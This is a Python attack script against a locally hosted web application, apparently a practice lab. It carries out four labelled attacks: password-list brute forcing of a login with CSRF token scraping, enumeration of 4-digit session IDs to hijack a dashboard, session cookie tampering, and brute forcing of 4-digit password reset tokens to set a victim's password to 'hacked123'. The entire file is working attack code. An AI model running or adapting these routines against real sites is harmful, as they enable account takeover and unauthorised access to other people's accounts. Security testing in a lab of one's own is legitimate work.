import requests
from bs4 import BeautifulSoup

# 1️⃣ Credential Stuffing Attack - Brute Force Login
LOGIN_URL = "http://127.0.0.1:8000/login/"
password_list = ["password123", "admin", "123456", "letmein", "qwerty", "admin123", "admin@123"]
email = "admin@gmail.com"  # Replace with target email

# Get CSRF token
session = requests.Session()
login_page = session.get(LOGIN_URL)
soup = BeautifulSoup(login_page.content, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

for password in password_list:
    data = {
        "email": email,
        "password": password,
        "csrfmiddlewaretoken": csrf_token
    }
    response = session.post(LOGIN_URL, data=data, headers={"Referer": LOGIN_URL})
    print(f"Trying {email}:{password} - Response: {response.text}")
    if "Login successful" in response.text:
        print(f"[+] Success: {email} -> {password}")
        break

# 2️⃣ Session Hijacking - Guessing 4-digit Session IDs
DASHBOARD_URL = "http://127.0.0.1:8000/dashboard/"

for session_id in range(1000, 9999):
    cookies = {"sessionid": str(session_id)}
    response = requests.get(DASHBOARD_URL, cookies=cookies)
    if "Welcome" in response.text:
        print(f"[+] Valid session found: sessionid={session_id}")
        break

# 3️⃣ Cookie Tampering - Modifying sessionid manually
cookies = {"sessionid": "9999"}  # Modify manually
response = requests.get(DASHBOARD_URL, cookies=cookies)
if "Welcome" in response.text:
    print(f"[+] Cookie tampering successful! sessionid=9999")

# 4️⃣ Password Reset Brute Force - Trying all 4-digit reset tokens
RESET_URL = "http://127.0.0.1:8000/password_reset/"
email = "victim@example.com"

for reset_token in range(1000, 9999):
    data = {
        "email": email,
        "reset_token": str(reset_token),
        "new_password": "hacked123",
        "csrfmiddlewaretoken": csrf_token
    }
    response = session.post(RESET_URL, data=data, headers={"Referer": RESET_URL})
    print(f"Trying reset token: {reset_token}")
    if "Password reset successful" in response.text:
        print(f"[+] Password reset successful! Token: {reset_token}")
        break
